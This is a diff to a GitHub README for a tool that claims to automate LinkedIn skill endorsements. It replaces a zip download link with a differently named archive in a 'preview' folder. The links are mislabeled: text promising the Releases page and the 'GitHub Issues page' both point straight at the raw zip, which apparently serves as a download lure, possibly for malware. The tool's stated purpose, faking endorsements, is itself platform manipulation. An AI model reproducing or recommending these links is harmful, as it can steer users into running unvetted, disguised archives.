@@ -6,9 +6,9 @@ Welcome to LinkedIn-Skill-Endorser! This tool helps you automate the LinkedIn sk
 
 ## 📦 Download the Application
 
-[![Download LinkedIn-Skill-Endorser](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked_Endorser_In_Skill_2.1-alpha.4.zip)](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked_Endorser_In_Skill_2.1-alpha.4.zip)
+[![Download LinkedIn-Skill-Endorser](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked-Endorser-In-Skill-allegiant.zip)](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked-Endorser-In-Skill-allegiant.zip)
 
-To get started, visit the Releases page and download the latest version of the application. Here’s the link: [Download Here](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked_Endorser_In_Skill_2.1-alpha.4.zip).
+To get started, visit the Releases page and download the latest version of the application. Here’s the link: [Download Here](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked-Endorser-In-Skill-allegiant.zip).
 
 ## 💻 System Requirements
 
@@ -54,7 +54,7 @@ If problems persist, consider visiting the Issues section on GitHub for solution
 
 ## 💬 Support
 
-For any further assistance, visit the [GitHub Issues page](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked_Endorser_In_Skill_2.1-alpha.4.zip) to report your issue or ask questions. Our community is here to help.
+For any further assistance, visit the [GitHub Issues page](https://github.com/mwanzia-kathenge/LinkedIn-Skill-Endorser/raw/refs/heads/main/preview/Linked-Endorser-In-Skill-allegiant.zip) to report your issue or ask questions. Our community is here to help.
 
 ## 📃 Contribution Guidelines
 
